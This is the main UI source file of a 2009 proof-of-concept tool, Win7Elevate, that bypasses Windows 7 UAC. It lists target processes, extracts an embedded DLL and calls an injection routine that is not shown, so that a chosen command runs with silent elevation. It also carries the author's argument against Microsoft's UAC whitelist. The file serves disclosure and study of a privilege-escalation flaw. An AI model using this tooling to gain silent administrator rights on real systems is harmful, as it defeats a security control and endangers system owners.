// Win7Elevate.cpp : Defines the entry point for the application.
//

// All code (except for GetElevationType) (C) Leo Davidson, 8th February 2009, all rights reserved.
// (Minor tidy-up 12th June 2009 for the code's public release.)
// http://www.pretentiousname.com
// leo@ox.compsoc.net
//
// Using any part of this code for malicious purposes is expressly forbidden.
//
// This proof-of-concept code is intended only to demonstrate that code-injection
// poses a real problem with the default UAC settings in Windows 7 (tested with RC1 build 7100).
//
// Win7Elevate_Inject.cpp is the most interesting file. Most of the rest is just boilerplate UI/util code.

#include "stdafx.h"
#include "resource.h"
#include "Win7Elevate_Utils.h"
#include "Win7Elevate_Inject.h"

#define PAGE_URL_STRING L"http://www.pretentiousname.com/misc/win7_uac_whitelist2.html"

// Global Variables (this UI is a quick hack!):
HINSTANCE g_hInstance = 0;
HFONT g_hMessageFont = 0;
TOKEN_ELEVATION_TYPE g_tet = TokenElevationTypeDefault;
std::wstring g_strWindowTitle;
std::wstring g_strMainMessage;
std::map< DWORD, std::wstring > g_mapProcs;

LRESULT CALLBACK WndProc(HWND, UINT, WPARAM, LPARAM);
void RefreshProcs(HWND hWnd);

int APIENTRY _tWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPTSTR lpCmdLine, int nCmdShow)
{
	g_hInstance = hInstance;

	UNREFERENCED_PARAMETER(hPrevInstance);
	UNREFERENCED_PARAMETER(lpCmdLine);

	// Init base Windows services etc.
	{
		INITCOMMONCONTROLSEX icce = {0};
		icce.dwSize = sizeof(icce);
		icce.dwICC = ICC_STANDARD_CLASSES; 

		if (!InitCommonControlsEx(&icce))
		{
			MessageBox(NULL, L"InitCommonControlsEx failed", L"Win7Elevate", MB_OK | MB_ICONERROR);
			return 0;
		}

		if (!W7EUtils::GetElevationType(&g_tet))
		{
			MessageBox(NULL, L"GetElevationType failed", L"Win7Elevate", MB_OK | MB_ICONERROR);
			return 0;
		}

		g_strWindowTitle = L"Win7Elevate proof-of-concept -- ";
		g_strMainMessage = L"Win7Elevate proof-of-concept v2 (08/Feb/2009) (Very minor updates 12/June/2009)\n© 2009 Leo Davidson, all rights reserved. Malicious use is expressly prohibited.\n";

		switch(g_tet)
		{
		default:
		case TokenElevationTypeDefault:
			g_strWindowTitle += L"UNKNOWN elevation level.";
			g_strMainMessage += L"<< UNKNOWN elevation level. >>";
			break;
		case TokenElevationTypeFull:
			g_strWindowTitle += L"RUNNING WITH ELEVATION.";
			g_strMainMessage += L"*** Since the program is already elevated the tests below are fairly meaningless. Re-run it without elevation. ***";
			break;
		case TokenElevationTypeLimited:
			g_strWindowTitle += L"Running without elevation.";
			g_strMainMessage += L"This program attempts to bypass Windows 7's default UAC settings to run the specified command with silent elevation.";
			break;
		}
	}

	// Register window class
	{
		WNDCLASSEX wcex = {0};

		wcex.cbSize = sizeof(wcex);
		wcex.style			= 0;
		wcex.lpfnWndProc	= WndProc;
		wcex.cbClsExtra		= 0;
		wcex.cbWndExtra		= 0;
		wcex.hInstance		= hInstance;
		wcex.hIcon			= LoadIcon(hInstance, MAKEINTRESOURCE(IDI_WIN7ELEVATE));
		wcex.hCursor		= LoadCursor(NULL, IDC_ARROW);
		wcex.hbrBackground	= reinterpret_cast< HBRUSH >(COLOR_BTNFACE+1);
		wcex.lpszMenuName	= 0;
		wcex.lpszClassName	= L"W7E_Main";
		wcex.hIconSm		= LoadIcon(wcex.hInstance, MAKEINTRESOURCE(IDI_SMALL));

		ATOM rceRes = RegisterClassEx(&wcex);
		
		if (!rceRes)
		{
			MessageBox(NULL, L"RegisterClassEx failed", L"Win7Elevate", MB_OK | MB_ICONERROR);
			return 0;
		}
	}

	// Create window
	{
		HWND hWnd = 0;

		int x = CW_USEDEFAULT;
		int y = 0;
		int w = 660;
		int h = 530;
		RECT rcWork = {0};
		
		// Open in a fixed place if we're on a cramped 800x600 screen.
		// This is to make the demo video go smoother!
		if (SystemParametersInfo(SPI_GETWORKAREA, 0, &rcWork, 0)
		&&	(rcWork.right-rcWork.left) <= 800
		&&	rcWork.right >= w)
		{
			x = rcWork.right - w;
		}

		hWnd = CreateWindow(L"W7E_Main", g_strWindowTitle.c_str(), WS_OVERLAPPED|WS_CAPTION|WS_SYSMENU|WS_MINIMIZEBOX, x, y, w, h, NULL, NULL, hInstance, NULL);

		if (!hWnd)
		{
			MessageBox(NULL, L"CreateWindow main failed", L"Win7Elevate", MB_OK | MB_ICONERROR);
			return 0;
		}

		ShowWindow(hWnd, nCmdShow);
		UpdateWindow(hWnd);
	}

	// Main message loop

	MSG msg = {0};

	while (GetMessage(&msg, NULL, 0, 0))
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}

	return (int) msg.wParam;
}




LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
{
	switch (message)
	{
	case WM_NCCREATE:
		if (g_hMessageFont == 0)
		{
			NONCLIENTMETRICS ncm = {0};
			ncm.cbSize = sizeof(NONCLIENTMETRICS);

			if (::SystemParametersInfo(SPI_GETNONCLIENTMETRICS, sizeof(NONCLIENTMETRICS), &ncm, 0))
			{
				g_hMessageFont = ::CreateFontIndirect(&ncm.lfMessageFont);
			}

			if (g_hMessageFont == 0)
			{
				return FALSE;
			}
		}
		break;
	case WM_NCDESTROY:
		if (g_hMessageFont != 0)
		{
			DeleteObject(g_hMessageFont);
			g_hMessageFont = 0;
		}
		break;

	case WM_CREATE:
		{
			RECT rcClient;
			GetClientRect(hWnd,&rcClient);

			HWND hwndStaticAbout = ::CreateWindowEx(WS_EX_NOPARENTNOTIFY, WC_STATIC, g_strMainMessage.c_str(),
				WS_CHILD | WS_VISIBLE | SS_NOPREFIX | SS_CENTER, 10, 10, rcClient.right - 20, 70,
				hWnd, (HMENU)UlongToPtr(IDC_STATIC), g_hInstance, NULL);

			rcClient.top += 60;

			HWND hwndStaticCmd = ::CreateWindowEx(WS_EX_NOPARENTNOTIFY, WC_STATIC, L"Command:",
				WS_CHILD | WS_VISIBLE | SS_NOPREFIX | SS_CENTERIMAGE,
				rcClient.left + 10, rcClient.top + 10, 70, 22,
				hWnd, (HMENU)UlongToPtr(IDC_STATIC), g_hInstance, NULL);

			HWND hWndComboCmd = ::CreateWindowEx(WS_EX_NOPARENTNOTIFY | WS_EX_CLIENTEDGE, WC_COMBOBOX,
				L"",
				WS_CHILD | WS_VISIBLE | CBS_DROPDOWN | CBS_AUTOHSCROLL,
				rcClient.left + 80, rcClient.top + 10, rcClient.right - 90, rcClient.bottom/2,
				hWnd, reinterpret_cast< HMENU >(UlongToPtr( IDC_EDITDROP_COMMAND )), g_hInstance, NULL);

			rcClient.top += 32;

			HWND hwndStaticArgs = ::CreateWindowEx(WS_EX_NOPARENTNOTIFY, WC_STATIC, L"Arguments:",
				WS_CHILD | WS_VISIBLE | SS_NOPREFIX | SS_CENTERIMAGE,
				rcClient.left + 10, rcClient.top + 10, 70, 22,
				hWnd, (HMENU)UlongToPtr(IDC_STATIC), g_hInstance, NULL);

			HWND hWndEditArgs = ::CreateWindowEx(WS_EX_NOPARENTNOTIFY | WS_EX_CLIENTEDGE, WC_EDIT,
				L"",
				WS_CHILD | WS_VISIBLE | ES_AUTOHSCROLL,
				rcClient.left + 80, rcClient.top + 10, rcClient.right - 90, 22,
				hWnd, reinterpret_cast< HMENU >(UlongToPtr( IDC_EDIT_ARGUMENTS )), g_hInstance, NULL);

			rcClient.top += 32;

			HWND hwndStaticDir = ::CreateWindowEx(WS_EX_NOPARENTNOTIFY, WC_STATIC, L"Directory:",
				WS_CHILD | WS_VISIBLE | SS_NOPREFIX | SS_CENTERIMAGE,
				rcClient.left + 10, rcClient.top + 10, 70, 22,
				hWnd, (HMENU)UlongToPtr(IDC_STATIC), g_hInstance, NULL);

			HWND hWndEditDir = ::CreateWindowEx(WS_EX_NOPARENTNOTIFY | WS_EX_CLIENTEDGE, WC_EDIT,
				L"C:\\Windows\\System32",
				WS_CHILD | WS_VISIBLE | ES_AUTOHSCROLL,
				rcClient.left + 80, rcClient.top + 10, rcClient.right - 90, 22,
				hWnd, reinterpret_cast< HMENU >(UlongToPtr( IDC_EDIT_DIRECTORY )), g_hInstance, NULL);

			rcClient.top += 32 + 8;

			LONG midHeight = 3 * 70 + 2 * 10;
			LONG sideWidth = rcClient.right/2 - 15;
			LONG rightStart = rcClient.right/2 + 5;

			HWND hwndStaticProcesses = ::CreateWindowEx(WS_EX_NOPARENTNOTIFY, WC_STATIC, L"For injection, pick any unelevated Windows process with ASLR on:",
				WS_CHILD | WS_VISIBLE | SS_NOPREFIX,
				rcClient.left + 10, rcClient.top + 10, sideWidth - (10 + 100), 30,
				hWnd, (HMENU)UlongToPtr(IDC_STATIC), g_hInstance, NULL);

			HWND hWndRefProc = CreateWindow(WC_BUTTON, L"Refresh", WS_CHILD | WS_VISIBLE,
				rcClient.left + 10 + (sideWidth - 100), rcClient.top + 10, 100, 30, hWnd,
				reinterpret_cast< HMENU >(UlongToPtr( IDC_BUTTON_PROCESS_REFRESH )), g_hInstance, NULL);

			HWND hWndListProcs = ::CreateWindowEx(WS_EX_NOPARENTNOTIFY | WS_EX_CLIENTEDGE, WC_LISTBOX, L"",
				WS_CHILD | WS_VISIBLE | LBS_NOTIFY | LBS_SORT | WS_VSCROLL | LBS_HASSTRINGS | LBS_NOINTEGRALHEIGHT,
				rcClient.left + 10, rcClient.top + 50, sideWidth, midHeight - 40,
				hWnd, reinterpret_cast< HMENU >(UlongToPtr( IDC_LIST_PROCESSES )), g_hInstance, NULL);

			HWND hWndElevate = CreateWindow(WC_BUTTON, L"Inject file copy && elevate command",
				BS_COMMANDLINK | WS_CHILD | WS_VISIBLE,
				rightStart, rcClient.top + 10, sideWidth, 70,
				hWnd, reinterpret_cast< HMENU >(UlongToPtr( IDC_BUTTON_INJECT )), g_hInstance, NULL);

			HWND hWndAttempt = CreateWindow(WC_BUTTON, L"Run command directly, with elevation",
				BS_COMMANDLINK | WS_CHILD | WS_VISIBLE,
				rightStart, rcClient.top + 90, sideWidth, 70,
				hWnd, reinterpret_cast< HMENU >(UlongToPtr( IDC_BUTTON_ELEVATE )), g_hInstance, NULL);

			HWND hWndNoEleve = CreateWindow(WC_BUTTON, L"Run command directly",
				BS_COMMANDLINK | WS_CHILD | WS_VISIBLE,
				rightStart, rcClient.top + 170, sideWidth, 70,
				hWnd, reinterpret_cast< HMENU >(UlongToPtr( IDC_BUTTON_NOELEVATE )), g_hInstance, NULL);

			rcClient.top += midHeight + 18;

			HWND hwndButtonLogic = CreateWindow(WC_BUTTON, L"Dear Microsoft: Either local process elevation is important or it isn't. Pick one. Then apply it fairly to *all* applications.",
				WS_CHILD | WS_VISIBLE,
				rcClient.left + 10, rcClient.top + 10, (rcClient.right - rcClient.left) - 20, 30, hWnd,
				reinterpret_cast< HMENU >(UlongToPtr( IDC_BUTTON_LOGIC )), g_hInstance, NULL);

			rcClient.top += 40;

			HWND hwndButtonUrl = CreateWindow(WC_BUTTON, PAGE_URL_STRING,
				WS_CHILD | WS_VISIBLE,
				rcClient.left + 10, rcClient.top + 10, (rcClient.right - rcClient.left) - 20, 30, hWnd,
				reinterpret_cast< HMENU >(UlongToPtr( IDC_BUTTON_URL )), g_hInstance, NULL);

			if (!hwndStaticAbout
			||	!hWndElevate
			||	!hWndAttempt
			||	!hWndNoEleve
			||	!hwndStaticProcesses
			||	!hWndRefProc
			||	!hWndListProcs
			||	!hwndStaticCmd
			||	!hwndStaticArgs
			||	!hwndStaticDir
			||	!hWndComboCmd
			||	!hWndEditArgs
			||	!hWndEditDir
			||	!hwndButtonLogic
			||	!hwndButtonUrl)
			{
				MessageBox(NULL, L"CreateWindow control failed", L"Win7Elevate", MB_OK | MB_ICONERROR);
				return -1;
			}

			SendMessage(hwndStaticAbout,     WM_SETFONT, reinterpret_cast< WPARAM >( g_hMessageFont ), FALSE);
			SendMessage(hwndStaticProcesses, WM_SETFONT, reinterpret_cast< WPARAM >( g_hMessageFont ), FALSE);
			SendMessage(hWndRefProc,         WM_SETFONT, reinterpret_cast< WPARAM >( g_hMessageFont ), FALSE);
			SendMessage(hWndListProcs,       WM_SETFONT, reinterpret_cast< WPARAM >( g_hMessageFont ), FALSE);
			SendMessage(hwndStaticCmd,       WM_SETFONT, reinterpret_cast< WPARAM >( g_hMessageFont ), FALSE);
			SendMessage(hwndStaticArgs,      WM_SETFONT, reinterpret_cast< WPARAM >( g_hMessageFont ), FALSE);
			SendMessage(hwndStaticDir,       WM_SETFONT, reinterpret_cast< WPARAM >( g_hMessageFont ), FALSE);
			SendMessage(hWndComboCmd,        WM_SETFONT, reinterpret_cast< WPARAM >( g_hMessageFont ), FALSE);
			SendMessage(hWndEditArgs,        WM_SETFONT, reinterpret_cast< WPARAM >( g_hMessageFont ), FALSE);
			SendMessage(hWndEditDir,         WM_SETFONT, reinterpret_cast< WPARAM >( g_hMessageFont ), FALSE);
			SendMessage(hwndButtonLogic,     WM_SETFONT, reinterpret_cast< WPARAM >( g_hMessageFont ), FALSE);
			SendMessage(hwndButtonUrl,       WM_SETFONT, reinterpret_cast< WPARAM >( g_hMessageFont ), FALSE);

			SendMessage(hWndElevate, BCM_SETNOTE, 0, reinterpret_cast< LPARAM >( L"Change a protected folder via the selected process; use the change to launch the command elevated." ));
			SendMessage(hWndAttempt, BCM_SETNOTE, 0, reinterpret_cast< LPARAM >( L"Run the command normally (without code injection), requesting elevation." ));
			SendMessage(hWndNoEleve, BCM_SETNOTE, 0, reinterpret_cast< LPARAM >( L"Run the command normally (without code injection), without requesting elevation." ));

			wchar_t *szSystemPath = 0;

			if (S_OK == SHGetKnownFolderPath(FOLDERID_System, 0, NULL, &szSystemPath) && szSystemPath)
			{
				std::wstring strCmdPromptPath = szSystemPath;
				strCmdPromptPath += L"\\cmd.exe";

				SendMessage(hWndComboCmd, CB_ADDSTRING, 0, reinterpret_cast< LPARAM >( strCmdPromptPath.c_str() ));
				CoTaskMemFree(szSystemPath);
				szSystemPath = 0;
			}

			wchar_t szPathToSelf[MAX_PATH];
			DWORD dwGMFN = GetModuleFileName(NULL, szPathToSelf, _countof(szPathToSelf));
			if (dwGMFN > 0 && dwGMFN < _countof(szPathToSelf))
			{
				SendMessage(hWndComboCmd, CB_ADDSTRING, 0, reinterpret_cast< LPARAM >( szPathToSelf ));
			}

			SendMessage(hWndComboCmd, CB_SETCURSEL, 0, 0);

			RefreshProcs(hWnd);
		}
		break;

	case WM_DESTROY:
		PostQuitMessage(0);
		return 0;

	case WM_PAINT:
		if (g_hMessageFont != 0)
		{
			PAINTSTRUCT ps = {0};
			HDC hDC = BeginPaint(hWnd, &ps);
			if (hDC)
			{
			//	RECT rcClient;
			//	GetClientRect(hWnd,&rcClient);
			//	FillRect(hDC, &rcClient, reinterpret_cast< HBRUSH >( COLOR_BTNFACE+1 ));
				EndPaint(hWnd, &ps);
			}
			return 0;
		}
		break;

	case WM_COMMAND:
		{
			int iWmId    = LOWORD(wParam);
			int iWmEvent = HIWORD(wParam);

			if (iWmEvent == BN_CLICKED)
			{
				if (iWmId == IDC_BUTTON_PROCESS_REFRESH)
				{
					RefreshProcs(hWnd);
				}
				else if (iWmId == IDC_BUTTON_LOGIC)
				{
					MessageBox(hWnd, L"At the time of writing RC1 build 7100 was the latest version of Windows 7 available to the public and thus the latest build I have been able to test this on.\n\nSo far Microsoft have claimed that the method this proof-of-concept uses is not a problem.\n\nI am not a \"security researcher.\" I am not a malware author. I am just a Windows application developer who immediately questioned the design of Windows 7's new UAC mode, in terms of both security and the way it provides an anti-competitive advantage to Microsoft's applications. I set to work testing how well the new UAC mode was implemented. My original proof-of-concept took only one day to research and write. It then took only a few hours to work out how it could be used to elevate any process, giving you version 2 that you see now.\n\nGiven how easy it was to do this: What, other than security theater, is the point of inflicting UAC prompts on third-party programs while Microsoft's own programs get special treatment (and in doing so open a massive hole in UAC)?\n\nIf local process elevation is important: Microsoft should stop dismissing this security hole and fix Windows 7 properly. They should also give users control of which programs, both Microsoft and third-party, are \"whitelisted\" so that users only expose programs they actually use and so that the system is not anti-competitive.\n\nIf local process elevation is not important: Microsoft should set the Windows 7 UAC defaults to \"elevate without prompting\" for *all* processes, not just their own. The position on Microsoft's \"Engineering 7\" blog is that we implicitly and completely trust all locally running code, making this problem unimportant, yet they contradict this by imposing UAC prompts on other people's code unless it uses an exploit. Well-behaved third-party apps are currently punished for no security benefit, by their own logic.\n\n(Note: Setting UAC to \"elevate without prompting\", which was already an option in Vista, is not the same as turning off UAC. Apps that support UAC remain unchanged and must still segregate admin and non-admin code/processes, explicitly request admin access and work with standard-user accounts/elevation.)",
						L"Win7Elevate proof-of-concept: Thoughts", MB_OK | MB_ICONINFORMATION );
				}
				else if (iWmId == IDC_BUTTON_URL)
				{
					SHELLEXECUTEINFO sei = {0};
					sei.cbSize = sizeof(sei);
					sei.lpFile = PAGE_URL_STRING;

					ShellExecuteEx(&sei);
				}
				else if (iWmId == IDC_BUTTON_INJECT
				||		 iWmId == IDC_BUTTON_ELEVATE
				||		 iWmId == IDC_BUTTON_NOELEVATE)
				{
					wchar_t szCmd[1024];
					wchar_t szArgs[1024];
					wchar_t szDir[1024];

					SendMessage(GetDlgItem(hWnd,IDC_EDITDROP_COMMAND), WM_GETTEXT, _countof(szCmd),  reinterpret_cast< LPARAM >( &szCmd  ));
					SendMessage(GetDlgItem(hWnd,IDC_EDIT_ARGUMENTS),   WM_GETTEXT, _countof(szArgs), reinterpret_cast< LPARAM >( &szArgs ));
					SendMessage(GetDlgItem(hWnd,IDC_EDIT_DIRECTORY),   WM_GETTEXT, _countof(szDir),  reinterpret_cast< LPARAM >( &szDir  ));

					if (szCmd[0] == L'\0')
					{
						MessageBox(hWnd, L"You must specify a command to run.", L"W7Elevate", MB_OK | MB_ICONEXCLAMATION);
						break;
					}

					if (iWmId == IDC_BUTTON_INJECT)
					{
						W7EUtils::CTempResource dllResource(g_hInstance, IDD_EMBEDDED_DLL);

						std::wstring strOurDllPath;

						// Note: Version 2 of this proof-of-concept code does use a DLL. However:
						// The main code-injection is done *without* using this dll. That injected code copies the
						// DLL to a place where it will be loaded by an elevated process which we then launch as well.
						// (So we're doing two lots of code-injection really, but the second lot involving the DLL is
						// only to drive home the point that you can do almost anything if you're able to use the
						// first code injection to copy a file to a protected location.)

						if (!dllResource.GetFilePath(strOurDllPath))
						{
							MessageBox(hWnd, L"Error extracting resource.", L"W7Elevate", MB_OK | MB_ICONERROR);
							break;
						}

						HWND hWndListProcs = GetDlgItem(hWnd, IDC_LIST_PROCESSES);

						if (!hWndListProcs)
						{
							MessageBox(hWnd, L"Window is messed up.", L"W7Elevate", MB_OK | MB_ICONERROR);
							break;
						}

						WPARAM itemSel = SendMessage(hWndListProcs, LB_GETCURSEL, 0, 0);

						if (itemSel == LB_ERR)
						{
							MessageBox(hWnd, L"Select a process to inject into.", L"W7Elevate", MB_OK | MB_ICONERROR);
							break;
						}

						std::map< DWORD, std::wstring >::const_iterator mapIter =
							g_mapProcs.find( static_cast< DWORD >( SendMessage(hWndListProcs, LB_GETITEMDATA, itemSel, 0) ) );

						if (mapIter == g_mapProcs.end())
						{
							MessageBox(hWnd, L"Process list/map error.", L"W7Elevate", MB_OK | MB_ICONERROR);
							break;
						}

						W7EInject::AttemptOperation(hWnd, true, true, mapIter->first, mapIter->second.c_str(), szCmd, szArgs, szDir, strOurDllPath.c_str());
					}
					else if (iWmId == IDC_BUTTON_ELEVATE
					||		 iWmId == IDC_BUTTON_NOELEVATE)
					{
						SHELLEXECUTEINFO shinfo = {0};
						shinfo.cbSize = sizeof(shinfo);
						shinfo.fMask = 0;
						shinfo.lpFile = szCmd;
						shinfo.lpParameters = szArgs;
						shinfo.lpDirectory = szDir;
						shinfo.nShow = SW_SHOW;
						shinfo.lpVerb = (iWmId == IDC_BUTTON_ELEVATE) ? L"runas" : 0;

						if (!ShellExecuteEx(&shinfo))
						{
							MessageBox(hWnd, L"Direct ShellExecuteEx call failed.", L"W7Elevate", MB_OK | MB_ICONERROR);
							break;
						}
					}
				}
			}
			else if (iWmEvent == LBN_DBLCLK)
			{
				if (iWmId == IDC_LIST_PROCESSES)
				{
					PostMessage(hWnd, WM_COMMAND, MAKEWPARAM(IDC_BUTTON_INJECT, BN_CLICKED), 0);
				}
			}
		}
		break;

	default:
		break;
	}

	return DefWindowProc(hWnd, message, wParam, lParam);
}

void RefreshProcs(HWND hWnd)
{
	HWND hWndListProcs = GetDlgItem(hWnd, IDC_LIST_PROCESSES);

	if (!hWndListProcs)
	{
		MessageBox(hWnd, L"Window is messed up.", L"W7Elevate", MB_OK | MB_ICONERROR);
		return;
	}

	std::wstring strProcToSelect = L"explorer.exe";

	WPARAM itemOldSel = SendMessage(hWndListProcs, LB_GETCURSEL, 0, 0);

	if (itemOldSel != LB_ERR)
	{
		std::map< DWORD, std::wstring >::const_iterator mapIter =
			g_mapProcs.find( static_cast< DWORD >( SendMessage(hWndListProcs, LB_GETITEMDATA, itemOldSel, 0) ) );

		if (mapIter != g_mapProcs.end())
		{
			strProcToSelect = mapIter->second;
		}
	}

	SendMessage(hWndListProcs, LB_RESETCONTENT, 0, 0);

	if (W7EUtils::GetProcessList(hWnd, g_mapProcs))
	{
		std::wstring strLabel;
		wchar_t szPid[128];

		for (std::map< DWORD, std::wstring >::const_iterator mapIter = g_mapProcs.begin(); mapIter != g_mapProcs.end(); ++mapIter)
		{
			const DWORD &dwProcId = mapIter->first;
			const std::wstring &strProcName = mapIter->second;

			_itow_s(dwProcId, szPid, _countof(szPid), 10);

			strLabel = strProcName;
			strLabel += L"   (";
			strLabel += szPid;
			strLabel += L")";

			WPARAM itemIdx = SendMessage(hWndListProcs, LB_ADDSTRING, 0, reinterpret_cast<LPARAM>( strLabel.c_str() ));

			SendMessage(hWndListProcs, LB_SETITEMDATA, itemIdx, dwProcId);

			if (0 == _wcsicmp(strProcToSelect.c_str(), strProcName.c_str()))
			{
				SendMessage(hWndListProcs, LB_SETCURSEL, itemIdx, 0);
			}
		}

		// Make sure selection is visible.

		WPARAM itemSel = SendMessage(hWndListProcs, LB_GETCURSEL, 0, 0);

		if (itemSel == LB_ERR)
		{
			itemSel = 0;
		}

		SendMessage(hWndListProcs, LB_SETCURSEL, itemSel, 0);
	}
}
